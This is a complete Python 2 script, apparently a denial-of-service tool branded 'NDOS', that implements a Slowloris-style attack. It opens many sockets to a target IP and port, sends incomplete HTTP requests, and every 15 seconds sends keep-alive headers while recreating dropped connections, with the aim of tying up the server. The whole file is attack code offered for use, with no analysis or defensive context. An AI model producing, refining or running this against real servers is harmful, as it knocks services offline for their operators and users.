import time
import sys
from threading import Thread
import socket
import random
from termcolor import colored

regular_headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Accept-language: en-US,en,q=0.5"]

print colored("\n\n##    ## ########   #######   ######  ", "red")
print colored("###   ## ##     ## ##     ## ##    ## ", "red")
print colored("####  ## ##     ## ##     ## ##       ", "red")
print colored("## ## ## ##     ## ##     ##  ######  ", "red")
print colored("##  #### ##     ## ##     ##       ## ", "red")
print colored("##   ### ##     ## ##     ## ##    ## ", "red")
print colored("##    ## ########   #######   ######  \n\n", "red")

def create_socket(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	s.connect((ip, int(port)))
	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
	for h in regular_headers:
		toSend = h + "\r\n"
		s.send(toSend.encode('UTF-8'))
	return s
def main():
	if len(sys.argv) < 4:
		print("Usage: " + sys.argv[0] + " <ip> <port> <socket count>")
		return

	ip = sys.argv[1]
	port = sys.argv[2]
	sCount = sys.argv[3]
	sList = []
	print(sCount + " sockets are being created...")
	for i in range(int(sCount)):
		try:
			s = create_socket(ip, port)
			sList.append(s)
			print("Created socket number " + str(i))
		except socket.error as e:
			print(str(e))
			sys.exit()
	print("[+] Done!")
	print("Keeping sockets alive...")
	while True:
		for s in sList:
			try:
				print("Sending keep-alive headers...")
				s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
			except socket.error:
				sList.remove(s)
		for i in range(int(sCount) - len(sList)):
			print("Recreating socket...")
			try:
				s = create_socket(ip, port)
				sList.append(s)
			except socket.error:
				break
		time.sleep(15)


if __name__ == "__main__":
	main()

